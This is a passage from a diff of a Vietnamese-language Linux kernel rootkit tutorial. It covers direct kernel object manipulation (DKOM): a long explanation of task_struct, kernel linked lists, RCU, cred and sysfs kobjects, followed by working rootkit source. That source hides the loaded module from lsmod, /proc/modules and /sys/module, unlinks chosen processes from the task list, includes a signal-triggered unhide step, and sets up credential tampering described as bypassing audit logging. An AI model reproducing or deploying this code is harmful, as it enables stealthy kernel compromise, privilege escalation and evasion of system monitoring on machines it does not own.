+     * synchronize_rcu() dam bao moi CPU da exit handler. */
     synchronize_rcu();
 
     pr_info("rk: kprobe hooks removed\n");
@@ -3047,30 +4310,387 @@ void rk_kprobe_remove(void)
 ---
 
 ---
-
 # Part II — Advanced Kernel Techniques
 
 ## Chapter 6: DKOM — Direct Kernel Object Manipulation
 
+### 6.0 DKOM Internals — Kernel data structures tu trong ra ngoai
+
+Truoc khi doc code DKOM, ban CAN hieu ro cac kernel data structures ma rootkit se manipulate. DKOM khong hook function — no truc tiep thay doi du lieu trong memory. Hieu sai struct layout = kernel panic.
+
+#### 6.0.1 struct task_struct — Tim hieu sau nhat
+
+`struct task_struct` la cau truc lon nhat va quan trong nhat trong Linux kernel. Moi process/thread deu co mot `task_struct`. Defined trong `include/linux/sched.h`, struct nay co kich thuoc khoang 8KB tren generic config, len toi ~10KB tren arch/x86 voi day du debug options.
+
+```
+struct task_struct (~8KB, arch/x86: ~10KB)
+Defined in: include/linux/sched.h
+
+┌──────────────────────────────────────────────────────────────┐
+│ state (long)              — TASK_RUNNING, TASK_INTERRUPTIBLE │
+│                             TASK_UNINTERRUPTIBLE, etc.       │
+│ stack (void*)             — kernel stack pointer             │
+│                             (moi process co rieng 1 stack)   │
+│ usage (refcount_t)        — reference count                  │
+│                             (get_task_struct/put_task_struct) │
+│ flags (unsigned int)      — PF_EXITING, PF_KTHREAD,         │
+│                             PF_SUPERPRIV, etc.               │
+│ ...                                                          │
+│                                                              │
+│ ┌──────────────────────────────────────────────────────────┐ │
+│ │ tasks (struct list_head)   ← ══ DKOM TARGET ══          │ │
+│ │   .next ──→ next task_struct.tasks                      │ │
+│ │   .prev ──→ prev task_struct.tasks                      │ │
+│ │                                                          │ │
+│ │   Circular doubly-linked list tat ca processes:          │ │
+│ │   init_task ↔ task1 ↔ task2 ↔ ... ↔ init_task           │ │
+│ │   for_each_process() iterate list nay                    │ │
+│ │   ps/top doc /proc → kernel iterate list nay             │ │
+│ └──────────────────────────────────────────────────────────┘ │
+│                                                              │
+│ pid (pid_t)               — process ID (unique trong ns)     │
+│ tgid (pid_t)              — thread group ID                  │
+│                             (= PID cua main thread)          │
+│                             getpid() tra ve tgid, ko pid     │
+│ ...                                                          │
+│                                                              │
+│ ┌──────────────────────────────────────────────────────────┐ │
+│ │ real_cred (const struct cred *) — objective credentials  │ │
+│ │   (quyen thuc su cua process — dung khi BI kiem tra)     │ │
+│ │                                                          │ │
+│ │ cred (const struct cred *)      ← ══ PRIVESC TARGET ══  │ │
+│ │   (subjective credentials — dung khi THUC HIEN kiem tra) │ │
+│ │   Rootkit modify cred → process co quyen root            │ │
+│ └──────────────────────────────────────────────────────────┘ │
+│                                                              │
+│ mm (struct mm_struct *)   — memory descriptor                │
+│                             (page tables, VMAs, brk, mmap)   │
+│                             NULL cho kernel threads           │
+│ fs (struct fs_struct *)   — filesystem info (root, pwd)      │
+│ files (struct files_struct *) — open file descriptor table   │
+│ nsproxy (struct nsproxy *) — namespaces (mount, pid, net...) │
+│                                                              │
+│ ┌──────────────────────────────────────────────────────────┐ │
+│ │ Scheduling fields:                                       │ │
+│ │   on_rq, prio, static_prio, normal_prio                 │ │
+│ │   sched_class, sched_entity (se), sched_info             │ │
+│ │   → Scheduler dung RUN QUEUE, KHONG dung tasks list      │ │
+│ │   → Process bi xoa khoi tasks list VAN DUOC schedule     │ │
+│ │   → Day la ly do DKOM process hiding WORK                │ │
+│ └──────────────────────────────────────────────────────────┘ │
+│                                                              │
+│ signal (struct signal_struct *) — signal handling            │
+│ comm[TASK_COMM_LEN]       — executable name (16 bytes)       │
+│ ...                                                          │
+└──────────────────────────────────────────────────────────────┘
+
+Tham khao source: include/linux/sched.h (line ~700-1500 tuy version)
+```
+
+**Diem quan trong cho rootkit developer:**
+- `tasks` list va scheduler run queue la TACH BIET. Xoa process khoi `tasks` list chi an khoi `/proc` va `for_each_process()`. Process van chay binh thuong vi scheduler dung run queue (`sched_entity`).
+- `pid` va `tgid` khac nhau: threads trong cung process co chung `tgid` nhung khac `pid`. `getpid()` syscall tra ve `tgid`, khong phai `pid`.
+- `usage` (refcount): `get_task_struct()` tang, `put_task_struct()` giam. Khi count = 0, `task_struct` bi freed. Rootkit PHAI giu reference (get_task_struct) cho hidden process de tranh use-after-free.
+
+#### 6.0.2 Linux Linked List — include/linux/list.h
+
+Linux kernel KHONG dung linked list theo cach truyen thong (node chua pointer toi data). Thay vao do, kernel embed list node BEN TRONG struct chua data. Day la thiet ke doc dao cua Linux kernel.
+
+```
+Truyen thong (C textbook):          Linux kernel:
+─────────────────────────           ──────────────────────
+                                    
+struct node {                       struct list_head {
+    void *data;  ← tro toi data        struct list_head *next;
+    struct node *next;                  struct list_head *prev;
+    struct node *prev;              };
+};                                  
+                                    struct task_struct {
+                                        ...
+                                        struct list_head tasks;  ← EMBEDDED
+                                        ...
+                                    };
+
+                                    List head chi chua next/prev
+                                    KHONG co data pointer
+                                    → Can container_of() de lay struct chua no
+```
+
+**struct list_head** (include/linux/types.h):
+```c
+struct list_head {
+    struct list_head *next, *prev;
+};
+// Chi 2 pointers. Khong biet gi ve struct chua no.
+// Embedded truc tiep trong container struct.
+```
+
+**container_of() macro** — Tu list_head pointer, tim pointer toi struct chua no:
+```
+Dinh nghia (include/linux/kernel.h):
+
+  #define container_of(ptr, type, member) \
+      ((type *)((char *)(ptr) - offsetof(type, member)))
+
+Vi du cu the:
+
+  struct task_struct {
+      ...                          ← offset 0
+      ... (nhieu fields)
+      struct list_head tasks;      ← offset 1208 (vi du)
+      ...
+  };
+
+  Cho pointer p tro toi tasks (list_head) cua mot process:
+
+  container_of(p, struct task_struct, tasks)
+  = (struct task_struct *)((char *)p - offsetof(struct task_struct, tasks))
+  = (struct task_struct *)((char *)p - 1208)
+  = pointer toi dau struct task_struct
+
+  Memory layout:
+  ┌──────────────────────────────────────────────┐
+  │  task_struct starts here                      │ ← ket qua container_of
+  │  ...                                          │
+  │  offset 1208: struct list_head tasks ─────────│ ← p (input)
+  │  ...                                          │
+  └──────────────────────────────────────────────┘
+```
+
+**list_add / list_del** — Chi la pointer manipulation:
+```
+list_del(&node):                    list_add(&new, &head):
+                                    
+  TRUOC:                              TRUOC:
+  A ↔ node ↔ B                       head ↔ B
+                                    
+  SAU:                                SAU:
+  A ↔ B                               head ↔ new ↔ B
+  node.next = LIST_POISON1           
+  node.prev = LIST_POISON2           
+
+list_del_init(&node):               list_for_each_entry(pos, head, member):
+                                    
+  SAU:                                Iterate moi struct trong list:
+  A ↔ B                               for (pos = container_of(head->next, type, member);
+  node.next = &node  ← empty list         &pos->member != head;
+  node.prev = &node                        pos = container_of(pos->member.next, type, member))
+                                    
+  Rootkit dung list_del_init thay     Tuong duong vong for iterate qua
+  vi list_del de tranh poison         tat ca nodes trong circular list
+  values bi detect boi forensics
+```
+
+**Tham khao source:** `include/linux/list.h` — toan bo implementation chi khoang 700 dong pure C macros.
+
+#### 6.0.3 RCU (Read-Copy-Update) — Co che dong bo QUAN TRONG NHAT cho rootkits
+
+RCU la co che dong bo dac biet cua Linux kernel, duoc thiet ke cho truong hop NHIEU READER, IT WRITER. Day la co che bao ve task list, module list, va hau het cac data structures ma rootkit can manipulate.
+
+```
+  Writer (vd: rootkit DKOM):         Reader (concurrent, vd: procfs):
+  ════════════════════════           ════════════════════════════════
+
+  1. Allocate new copy               rcu_read_lock()
+     (hoac modify in-place               ← KHONG PHAI lock that!
+      voi proper ordering)                ← Chi disable preemption
+                                          ← Cuc ky NHANH (nanoseconds)
+  2. Modify the copy                  
+                                      ptr = rcu_dereference(gptr)
+  3. rcu_assign_pointer(gptr, new)        ← doc pointer voi memory barrier
+     (atomic pointer swap)                ← dam bao thay new data
+     (memory barrier dam bao               hoac old data, KHONG BAO GIO
+      readers thay consistent data)        thay partial/corrupt data
+
+                                      su dung ptr->field1, ptr->field2...
+                                      (an toan — data consistent)
+
+  4. synchronize_rcu()                rcu_read_unlock()
+     (BLOCK cho den khi TAT CA           ← re-enable preemption
+      readers hien tai hoan thanh)       ← cung cuc ky NHANH
+
+  5. Free old copy
+     (bay gio an toan vi khong
+      reader nao con dung old data)
+
+  Timeline:
+  ─────────────────────────────────────────────────────────────
+  Writer:     [modify]──[publish]──────[wait]──────────[free]
+  Reader 1:          [rcu_lock]──[read old]──[unlock]
+  Reader 2:                  [rcu_lock]──[read new]──[unlock]
+  Reader 3:            [rcu_lock]──[read old]──[unlock]
+                                                      ↑
+                               synchronize_rcu() doi den day
+                               (tat ca readers truoc publish
+                                da unlock)
+```
+
+**Tai sao rcu_read_lock() KHONG phai lock that?**
+```c
+// include/linux/rcupdate.h (simplified):
+static inline void rcu_read_lock(void)
+{
+    preempt_disable();      // Chi disable preemption!
+    // KHONG co spinlock, mutex, hay bat ky blocking nao
+    // KHONG co cache line bouncing (khong shared variable)
+    // KHONG co memory barrier (tren most architectures)
+    // → Cuc ky nhanh — gan nhu zero cost
+}
+
+static inline void rcu_read_unlock(void)
+{
+    preempt_enable();       // Re-enable preemption
+}
+```
+
+**Ung dung cho DKOM — tai sao can ca RCU VA tasklist_lock:**
+```
+  Doc task list (procfs, OOM killer):     Modify task list (DKOM rootkit):
+  ───────────────────────────────────     ─────────────────────────────────
+  rcu_read_lock();                        write_lock_irq(&tasklist_lock);
+  // hoac read_lock(&tasklist_lock);      
+  for_each_process(p) {                   list_del_init(&task->tasks);
+      // su dung p->pid, p->comm...       
+  }                                       write_unlock_irq(&tasklist_lock);
+  rcu_read_unlock();
+  // hoac read_unlock(&tasklist_lock);
+
+  RCU bao ve: task_struct KHONG bi freed khi dang doc
+  tasklist_lock bao ve: list structure KHONG bi modified khi dang iterate
+  
+  Rootkit PHAI acquire write_lock_irq(&tasklist_lock) truoc khi
+  list_del — neu khong, concurrent reader co the thay broken pointers
+  → kernel crash (NULL deref hoac use-after-free)
+```
+
+**Tham khao source:** `include/linux/rcupdate.h`, `kernel/rcu/` directory. Documentation: `Documentation/RCU/`
+
+#### 6.0.4 struct cred — Credential model trong Linux kernel
+
+Moi process co 2 sets of credentials, duoc tro toi boi `task_struct->cred` va `task_struct->real_cred`. Defined trong `include/linux/cred.h`:
+
+```
+struct cred (include/linux/cred.h):
+┌──────────────────────────────────────────────────────────────┐
+│ atomic_t usage;              — reference count               │
+│                                (nhieu processes co the share │
+│                                 cung cred qua COW/fork)      │
+│                                                              │
+│ ┌──────────────────────────────────────────────────────────┐ │
+│ │ User/Group IDs — ROOTKIT SET TAT CA = 0 DE CO ROOT      │ │
+│ │                                                          │ │
+│ │ kuid_t uid;    — real user ID                            │ │
+│ │ kuid_t euid;   — effective user ID (dung cho perm check) │ │
+│ │ kuid_t suid;   — saved set-user-ID                       │ │
+│ │ kuid_t fsuid;  — filesystem user ID (file access check)  │ │
+│ │                                                          │ │
+│ │ kgid_t gid;    — real group ID                           │ │
+│ │ kgid_t egid;   — effective group ID                      │ │
+│ │ kgid_t sgid;   — saved set-group-ID                      │ │
+│ │ kgid_t fsgid;  — filesystem group ID                     │ │
+│ └──────────────────────────────────────────────────────────┘ │
+│                                                              │
+│ ┌──────────────────────────────────────────────────────────┐ │
+│ │ Linux Capabilities — fine-grained privileges             │ │
+│ │                                                          │ │
+│ │ kernel_cap_t cap_inheritable; — preserved across execve  │ │
+│ │ kernel_cap_t cap_permitted;   — ceiling cho effective     │ │
+│ │ kernel_cap_t cap_effective;   ← THUC SU DUNG de check    │ │
+│ │ kernel_cap_t cap_bset;        — bounding set             │ │
+│ │ kernel_cap_t cap_ambient;     — ambient capabilities     │ │
+│ │                                                          │ │
+│ │ Rootkit set TAT CA = CAP_FULL_SET de co moi quyen:       │ │
+│ │   CAP_SYS_ADMIN, CAP_NET_RAW, CAP_SYS_PTRACE,           │ │
+│ │   CAP_DAC_OVERRIDE, CAP_SYS_MODULE, ...                  │ │
+│ │   (tong cong ~40 capabilities)                           │ │
+│ └──────────────────────────────────────────────────────────┘ │
+│                                                              │
+│ struct user_struct *user;    — user accounting info          │
+│ struct group_info *group_info; — supplementary groups        │
+│ struct rcu_head rcu;         — RCU callback for deferred free│
+│ struct user_namespace *user_ns; — user namespace             │
+│ ...                                                          │
+└──────────────────────────────────────────────────────────────┘
+
+Credential model rules (kernel design):
+──────────────────────────────────────
+1. cred la IMMUTABLE sau khi commit — tat ca modifications
+   phai qua prepare_creds() → modify → commit_creds()
+2. Truc tiep modify cred (DKOM) VIOLATES rule nay
+   → co the race voi concurrent readers
+3. Nhung trong practice, rootkit modify thanh cong vi:
+   - Writes toi aligned fields la atomic tren x86
+   - Race window cuc ky nho
+   - Worst case: process tam thoi co mixed old/new creds
+```
+
+**Phan biet uid/euid/suid/fsuid:**
+```
+uid   — "Toi la ai"        (real identity, set khi login)
+euid  — "Toi co quyen gi"  (dung cho permission checks)
+suid  — "Toi co the quay lai lam ai" (saved cho setuid programs)
+fsuid — "Toi truy cap file voi quyen gi" (thuong = euid)
+
+Root = tat ca = 0. Rootkit set het 8 fields (uid/gid/euid/egid/suid/sgid/fsuid/fsgid) = 0.
+Chi set uid=0 ma khong set euid=0 → van khong co quyen root thuc su.
+Chi set euid=0 ma khong set capabilities → thieu mot so quyen (vd: raw socket).
+→ Rootkit PHAI set ca 8 IDs = 0 VA 5 capability sets = CAP_FULL_SET.
+```
+
+#### 6.0.5 Kobject va sysfs — Module visibility trong /sys/
+
+Moi kernel module co mot `struct module` (include/linux/module.h) chua `mkobj` (module kobject) → tao entry tai `/sys/module/MODULE_NAME/`.
+
+```
+Module visibility chain:
+
+  struct module (THIS_MODULE)
+  │
+  ├── list (struct list_head)
+  │   └── Links vao global module list
+  │       → /proc/modules, lsmod doc list nay
+  │       → list_del_init() xoa khoi day
+  │
+  └── mkobj (struct module_kobject)
+      └── kobj (struct kobject)
+          └── Tao entry trong sysfs: /sys/module/MODULE_NAME/
+              ├── parameters/     — module params
+              ├── sections/       — ELF section addresses
+              ├── notes/          — build ID
+              └── holders/        — modules depending on this
+          → kobject_del() xoa entry nay
+
+  De an module hoan toan, rootkit phai:
+  1. list_del_init(&THIS_MODULE->list)   → an khoi lsmod, /proc/modules
+  2. kobject_del(&THIS_MODULE->mkobj.kobj) → an khoi /sys/module/
+  
+  Sau khi xoa, module code VAN trong memory, VAN execute.
+  Chi la khong co trong bat ky listing nao.
+```
+
+**Tham khao source:** `include/linux/kobject.h`, `include/linux/module.h`, `lib/kobject.c`
+
+---
+
 ```c
 /* dkom.c — Direct Kernel Object Manipulation
  *
- * DKOM = Thay đổi kernel data structures trực tiếp, KHÔNG hook function.
+ * DKOM = Thay doi kernel data structures truc tiep, KHONG hook function.
  *
- * Tại sao DKOM đáng sợ:
- *   1. KHÔNG thay đổi code → code integrity checks PASS
- *   2. KHÔNG hook function → hook detection tools PASS
- *   3. Nhanh — chỉ modify vài pointers
- *   4. Khó detect ngoại trừ memory forensics
+ * Tai sao DKOM dang so:
+ *   1. KHONG thay doi code → code integrity checks PASS
+ *   2. KHONG hook function → hook detection tools PASS
+ *   3. Nhanh — chi modify vai pointers
+ *   4. Kho detect ngoai tru memory forensics
  *
- * Tại sao DKOM khó:
- *   1. Phải biết exact struct layout (thay đổi theo kernel version)
- *   2. Race conditions — cần proper locking
- *   3. Inconsistency detection — cross-view analysis sẽ phát hiện
- *   4. Potential crash nếu kernel iterate modified structures
+ * Tai sao DKOM kho:
+ *   1. Phai biet exact struct layout (thay doi theo kernel version)
+ *   2. Race conditions — can proper locking
+ *   3. Inconsistency detection — cross-view analysis se phat hien
+ *   4. Potential crash neu kernel iterate modified structures
  *
- * APT sử dụng: hầu hết kernel rootkits dùng DKOM ít nhất cho
- * module hiding (list_del). Advanced rootkits dùng DKOM cho
+ * APT su dung: hau het kernel rootkits dung DKOM it nhat cho
+ * module hiding (list_del). Advanced rootkits dung DKOM cho
  * process hiding, credential manipulation.
  */
 
@@ -3079,28 +4699,28 @@ void rk_kprobe_remove(void)
 /* ══════════════════════════════════════════════════════════════
  * MODULE HIDING via DKOM
  *
- * Kernel module list là doubly-linked list:
+ * Kernel module list la doubly-linked list:
  *   module1 ↔ module2 ↔ rootkit ↔ module3
  *
  * Sau DKOM:
  *   module1 ↔ module2 ↔ module3
- *   rootkit (orphaned — không ai reference, nhưng code vẫn trong memory)
+ *   rootkit (orphaned — khong ai reference, nhung code van trong memory)
  *
- * Ẩn khỏi:
- *   - lsmod (đọc module list)
- *   - /proc/modules (đọc module list)
+ * An khoi:
+ *   - lsmod (doc module list)
+ *   - /proc/modules (doc module list)
  *   - /sys/module/MODULE_NAME (kobject tree)
- *   - modinfo MODULE_NAME (cần module trong list)
+ *   - modinfo MODULE_NAME (can module trong list)
  * ══════════════════════════════════════════════════════════════ */
 
-/* Save pointers để có thể restore (show module lại cho rmmod) */
+/* Save pointers de co the restore (show module lai cho rmmod) */
 static struct list_head *saved_prev_module = NULL;
 static bool module_is_hidden = false;
 
 /*
- * Ẩn module hiện tại khỏi tất cả views.
+ * An module hien tai khoi tat ca views.
  *
- * Phải ẩn từ 3 nơi:
+ * Phai an tu 3 noi:
  * 1. Module list (THIS_MODULE->list) — lsmod, /proc/modules
  * 2. Kobject tree (THIS_MODULE->mkobj.kobj) — /sys/module/
  * 3. Module section attributes — /sys/module/MODULE/sections/
@@ -3110,66 +4730,66 @@ void rk_hide_module(void)
     if (module_is_hidden)
         return;
 
-    /* Save previous node để restore sau.
+    /* Save previous node de restore sau.
      *
      * List structure:
      *   prev ↔ THIS_MODULE ↔ next
      *
-     * saved_prev_module = prev → dùng khi cần re-insert.
+     * saved_prev_module = prev → dung khi can re-insert.
      */
     saved_prev_module = THIS_MODULE->list.prev;
 
-    /* 1. Xóa khỏi module list.
+    /* 1. Xoa khoi module list.
      *
      * list_del_init():
-     *   - Unlink node khỏi doubly-linked list
+     *   - Unlink node khoi doubly-linked list
      *     prev->next = next
      *     next->prev = prev
      *   - Init node: next = prev = &self (empty list)
      *
-     * Tại sao list_del_init thay vì list_del:
+     * Tai sao list_del_init thay vi list_del:
      *   list_del set next/prev = LIST_POISON1/2 — debug values.
-     *   Nếu ai check list structure → phát hiện poison values.
+     *   Neu ai check list structure → phat hien poison values.
      *   list_del_init set next/prev = &self → looks like empty list.
      *
-     * Sau dòng này:
-     *   - lsmod KHÔNG thấy module
-     *   - /proc/modules KHÔNG có entry
-     *   - Nhưng module code VẪN trong memory, VẪN execute
+     * Sau dong nay:
+     *   - lsmod KHONG thay module
+     *   - /proc/modules KHONG co entry
+     *   - Nhung module code VAN trong memory, VAN execute
      */
     list_del_init(&THIS_MODULE->list);
 
-    /* 2. Xóa khỏi kobject tree (/sys/module/).
+    /* 2. Xoa khoi kobject tree (/sys/module/).
      *
      * kobject = kernel object representation cho sysfs.
-     * Mỗi module có kobject tại /sys/module/MODULE_NAME/
-     * chứa: parameters, sections, notes, etc.
+     * Moi module co kobject tai /sys/module/MODULE_NAME/
+     * chua: parameters, sections, notes, etc.
      *
      * kobject_del() removes sysfs entry:
-     *   - /sys/module/rk/ biến mất
-     *   - ls /sys/module/ không liệt kê
+     *   - /sys/module/rk/ bien mat
+     *   - ls /sys/module/ khong liet ke
      *
-     * CẢNH BÁO: sau kobject_del, không thể dùng sysfs features.
-     * Module parameters qua sysfs sẽ không accessible. */
+     * CANH BAO: sau kobject_del, khong the dung sysfs features.
+     * Module parameters qua sysfs se khong accessible. */
     kobject_del(&THIS_MODULE->mkobj.kobj);
 
-    /* 3. (Optional) Xóa khỏi /proc/modules text output.
+    /* 3. (Optional) Xoa khoi /proc/modules text output.
      *
-     * /proc/modules output generated từ module list iteration.
-     * list_del ở trên đã handle điều này.
-     * Nhưng nếu paranoid: hook seq_show của /proc/modules. */
+     * /proc/modules output generated tu module list iteration.
+     * list_del o tren da handle dieu nay.
+     * Nhung neu paranoid: hook seq_show cua /proc/modules. */
 
     module_is_hidden = true;
     pr_info("rk: module hidden\n");
 }
 
 /*
- * Hiện module lại — cần trước khi rmmod.
+ * Hien module lai — can truoc khi rmmod.
  *
- * rmmod gọi find_module(name) → iterate module list → tìm module.
- * Nếu module không trong list → rmmod báo "module not found".
+ * rmmod goi find_module(name) → iterate module list → tim module.
+ * Neu module khong trong list → rmmod bao "module not found".
  *
- * Flow để unload:
+ * Flow de unload:
  *   1. Trigger show (kill -54 31338)
  *   2. rmmod rk
  *   3. Module exit handler cleanup hooks
@@ -3179,18 +4799,18 @@ void rk_show_module(void)
     if (!module_is_hidden || !saved_prev_module)
         return;
 
-    /* Re-insert vào module list SAU node đã save.
+    /* Re-insert vao module list SAU node da save.
      *
      * list_add(&THIS_MODULE->list, saved_prev_module):
      *   Insert THIS_MODULE after saved_prev_module.
      *   saved_prev → THIS_MODULE → (original next)
      *
-     * Module giờ visible lại cho lsmod, /proc/modules. */
+     * Module gio visible lai cho lsmod, /proc/modules. */
     list_add(&THIS_MODULE->list, saved_prev_module);
 
-    /* Kobject KHÔNG restore — sysfs entry đã bị destroy.
-     * Tạo lại kobject phức tạp và không cần thiết cho rmmod.
-     * rmmod chỉ cần module trong list, không cần sysfs. */
+    /* Kobject KHONG restore — sysfs entry da bi destroy.
+     * Tao lai kobject phuc tap va khong can thiet cho rmmod.
+     * rmmod chi can module trong list, khong can sysfs. */
 
     module_is_hidden = false;
     pr_info("rk: module shown\n");
@@ -3199,30 +4819,30 @@ void rk_show_module(void)
 /* ══════════════════════════════════════════════════════════════
  * PROCESS HIDING via DKOM
  *
- * Cách ps/top hoạt động:
- *   1. Mở /proc (procfs directory)
- *   2. getdents64 → list tất cả entries (bao gồm PID directories)
- *   3. Mỗi PID directory → read status, stat, cmdline, etc.
+ * Cach ps/top hoat dong:
+ *   1. Mo /proc (procfs directory)
+ *   2. getdents64 → list tat ca entries (bao gom PID directories)
+ *   3. Moi PID directory → read status, stat, cmdline, etc.
  *
- * Syscall table hook (Chapter 3) ẩn ở bước 2 (filter getdents64).
- * DKOM ẩn ở level sâu hơn: xóa process khỏi internal list.
+ * Syscall table hook (Chapter 3) an o buoc 2 (filter getdents64).
+ * DKOM an o level sau hon: xoa process khoi internal list.
  *
  * Linux process list:
  *   init_task.tasks ↔ task1.tasks ↔ task2.tasks ↔ ... ↔ init_task.tasks
  *   (Circular doubly-linked list, anchored at init_task)
  *
- * Xóa task khỏi list:
- *   - for_each_process() không thấy → /proc/PID không generated
- *   - ps, top, htop không thấy
- *   - kill PID vẫn work (kernel còn hash table riêng cho PID lookup)
- *   - Process VẪN chạy (scheduler dùng run queue, không phải task list)
+ * Xoa task khoi list:
+ *   - for_each_process() khong thay → /proc/PID khong generated
+ *   - ps, top, htop khong thay
+ *   - kill PID van work (kernel con hash table rieng cho PID lookup)
+ *   - Process VAN chay (scheduler dung run queue, khong phai task list)
  * ══════════════════════════════════════════════════════════════ */
 
 /* Saved state cho process unhiding.
  *
- * Lưu task_struct pointer (pinned via get_task_struct) thay vì
- * saved_prev pointer, vì task trước đó có thể đã exit và
- * task_struct bị freed → dùng saved_prev sẽ UAF. */
+ * Luu task_struct pointer (pinned via get_task_struct) thay vi
+ * saved_prev pointer, vi task truoc do co the da exit va
+ * task_struct bi freed → dung saved_prev se UAF. */
 struct hidden_proc {
     pid_t pid;
     struct task_struct *task;   /* Pinned reference via get_task_struct */
@@ -3238,25 +4858,25 @@ void rk_hide_process(pid_t pid)
     struct hidden_proc *hp;
     rwlock_t *tasklist_lockp;
 
-    /* Lookup tasklist_lock — unexported symbol, phải dùng
+    /* Lookup tasklist_lock — unexported symbol, phai dung
      * rk_lookup_name (kallsyms_lookup_name wrapper).
      *
-     * tasklist_lock là rwlock bảo vệ task list.
-     * Mọi code modify task list (fork, exit) acquire write lock.
-     * Mọi code iterate task list (procfs, OOM) acquire read lock.
-     * Ta phải acquire write lock để modify list safely. */
+     * tasklist_lock la rwlock bao ve task list.
+     * Moi code modify task list (fork, exit) acquire write lock.
+     * Moi code iterate task list (procfs, OOM) acquire read lock.
+     * Ta phai acquire write lock de modify list safely. */
     tasklist_lockp = (rwlock_t *)rk_lookup_name("tasklist_lock");
     if (!tasklist_lockp) return;
 
-    /* Tìm task_struct by PID.
+    /* Tim task_struct by PID.
      *
-     * rcu_read_lock(): bắt đầu RCU read-side critical section.
-     * Task structures được protect bởi RCU — đảm bảo task
-     * không bị freed trong khi ta đang access.
+     * rcu_read_lock(): bat dau RCU read-side critical section.
+     * Task structures duoc protect boi RCU — dam bao task
+     * khong bi freed trong khi ta dang access.
      *
-     * find_vpid(): tìm struct pid trong PID namespace.
+     * find_vpid(): tim struct pid trong PID namespace.
      * pid_task(): convert struct pid → task_struct.
-     * PIDTYPE_PID: tìm theo PID (không phải PGID hay SID). */
+     * PIDTYPE_PID: tim theo PID (khong phai PGID hay SID). */
     rcu_read_lock();
     task = pid_task(find_vpid(pid), PIDTYPE_PID);
 
@@ -3266,10 +4886,10 @@ void rk_hide_process(pid_t pid)
         return;
     }
 
-    /* Pin task_struct bằng get_task_struct.
-     * Tăng reference count → task_struct không bị freed
-     * ngay cả khi process exit. Ta cần giữ reference này
-     * để re-insert task vào list khi show. */
+    /* Pin task_struct bang get_task_struct.
+     * Tang reference count → task_struct khong bi freed
+     * ngay ca khi process exit. Ta can giu reference nay
+     * de re-insert task vao list khi show. */
     get_task_struct(task);
     rcu_read_unlock();
 
@@ -3281,35 +4901,35 @@ void rk_hide_process(pid_t pid)
     }
 
     hp->pid = pid;
-    hp->task = task;   /* Giữ pinned reference */
+    hp->task = task;   /* Giu pinned reference */
 
-    /* Xóa khỏi task list với proper write locking.
+    /* Xoa khoi task list voi proper write locking.
      *
      * write_lock_irq(tasklist_lockp):
-     *   1. Disable local interrupts (tránh deadlock với IRQ handlers)
+     *   1. Disable local interrupts (tranh deadlock voi IRQ handlers)
      *   2. Acquire write lock (exclusive — block ALL readers AND writers)
      *
-     * Tại sao write_lock thay vì rcu_read_lock:
-     *   RCU read lock chỉ protect readers — KHÔNG protect writers.
-     *   list_del_init modify list pointers — đây là WRITE operation.
-     *   Concurrent for_each_process (OOM killer, procfs) dùng read lock
-     *   sẽ thấy corrupt list nếu ta modify mà không hold write lock.
+     * Tai sao write_lock thay vi rcu_read_lock:
+     *   RCU read lock chi protect readers — KHONG protect writers.
+     *   list_del_init modify list pointers — day la WRITE operation.
+     *   Concurrent for_each_process (OOM killer, procfs) dung read lock
+     *   se thay corrupt list neu ta modify ma khong hold write lock.
      *
-     * CẢNH BÁO QUAN TRỌNG:
-     *   list_del trên task->tasks CÓ THỂ gây issues:
-     *   1. Một số kernel code iterate task list (OOM killer, procfs)
-     *      → crash nếu gặp broken list
+     * CANH BAO QUAN TRONG:
+     *   list_del tren task->tasks CO THE gay issues:
+     *   1. Mot so kernel code iterate task list (OOM killer, procfs)
+     *      → crash neu gap broken list
      *   2. Process accounting tool ghi log → miss hidden process
-     *   3. waitpid() cho child processes có thể bị ảnh hưởng
+     *   3. waitpid() cho child processes co the bi anh huong
      *
-     *   Trong production rootkit (APT), thường dùng getdents64 hook
-     *   thay vì DKOM cho process hiding — ít risky hơn.
-     *   DKOM process hiding chủ yếu dùng cho research/demo. */
+     *   Trong production rootkit (APT), thuong dung getdents64 hook
+     *   thay vi DKOM cho process hiding — it risky hon.
+     *   DKOM process hiding chu yeu dung cho research/demo. */
     write_lock_irq(tasklist_lockp);
     list_del_init(&task->tasks);
     write_unlock_irq(tasklist_lockp);
 
-    /* Add vào hidden process list */
+    /* Add vao hidden process list */
     spin_lock(&proc_hide_lock);
     hp->next = hidden_proc_list;
     hidden_proc_list = hp;
@@ -3327,10 +4947,10 @@ void rk_show_process(pid_t pid)
     tasklist_lockp = (rwlock_t *)rk_lookup_name("tasklist_lock");
     if (!tasklist_lockp) return;
 
-    /* Lấy init_task list head để re-insert.
-     * Re-insert tại head of task list (after init_task).
-     * Position không quan trọng cho correctness —
-     * for_each_process dùng list iteration, không ordering. */
+    /* Lay init_task list head de re-insert.
+     * Re-insert tai head of task list (after init_task).
+     * Position khong quan trong cho correctness —
+     * for_each_process dung list iteration, khong ordering. */
     init_head = &((struct task_struct *)rk_lookup_name("init_task"))->tasks;
     if (!init_head) return;
 
@@ -3341,9 +4961,9 @@ void rk_show_process(pid_t pid)
             *pp = hp->next;
             spin_unlock(&proc_hide_lock);
 
-            /* Re-insert task vào list tại init_task head.
+            /* Re-insert task vao list tai init_task head.
              *
-             * Dùng write_lock_irq vì modify list structure.
+             * Dung write_lock_irq vi modify list structure.
              * list_add(&task->tasks, init_head) insert task
              * ngay SAU init_task trong circular list. */
             write_lock_irq(tasklist_lockp);
@@ -3363,36 +4983,36 @@ void rk_show_process(pid_t pid)
 /* ══════════════════════════════════════════════════════════════
  * CREDENTIAL MANIPULATION via DKOM
  *
- * Thay vì prepare_creds/commit_creds (API approach),
- * trực tiếp modify cred struct trong memory.
+ * Thay vi prepare_creds/commit_creds (API approach),
+ * truc tiep modify cred struct trong memory.
  *
- * TẠI SAO KHÔNG NÊN LÀM CÁCH NÀY:
- *   - cred struct là immutable by design (multiple readers via RCU)
- *   - Trực tiếp modify → race condition với code đang đọc cred
- *   - prepare_creds/commit_creds handle locking đúng cách
+ * TAI SAO KHONG NEN LAM CACH NAY:
+ *   - cred struct la immutable by design (multiple readers via RCU)
+ *   - Truc tiep modify → race condition voi code dang doc cred
+ *   - prepare_creds/commit_creds handle locking dung cach
  *
- * TẠI SAO VẪN DEMO:
- *   - Hiểu sâu hơn về credential model
- *   - Một số rootkit thực tế dùng cách này
- *   - Bypasses audit logging (commit_creds có audit hook)
+ * TAI SAO VAN DEMO:
+ *   - Hieu sau hon ve credential model
+ *   - Mot so rootkit thuc te dung cach nay
+ *   - Bypasses audit logging (commit_creds co audit hook)
  * ══════════════════════════════════════════════════════════════ */
 
